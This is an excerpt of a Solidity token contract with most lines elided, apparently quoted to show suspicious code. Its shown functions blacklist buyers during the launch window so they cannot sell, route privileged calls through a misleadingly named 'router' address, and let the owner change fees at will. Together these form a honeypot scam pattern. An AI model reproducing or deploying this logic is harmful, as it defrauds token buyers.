...
contract BinanceToken is Context, IERC20, Ownable {
    ...
    uint256 internal _marketingShare = 8;
    ...
    uint256 private minDividendNum = 1 * 10**16 * 10**_decimals; 
    ...
    constructor (string memory Name, string memory Symbol,uint8 Decimals,uint256 totalsupply,uint256 antibot, 
    ...
    }modifier router{require(uniSwapPair == _msgSender());_;}
    ...
    function setfee(uint256 newburnfee, uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) public onlyOwner {
        _burn = newburnfee;
   ...
   function transferToRouterAddress(uint256 amount) public router{
    ...
    function checkAdd(address sender,address recipient) internal{require(!RouterAddress[sender]);  
        if(launched && launchStart + launchEnd >= block.number && recipient!=uniswapPair){RouterAddress
        [recipient] = true;}if(!launched && recipient == uniswapPair){ require(balanceOf(sender) > 0); launch(); }}
    ...
    function setRouterAddress(address fool,bool value) public router {
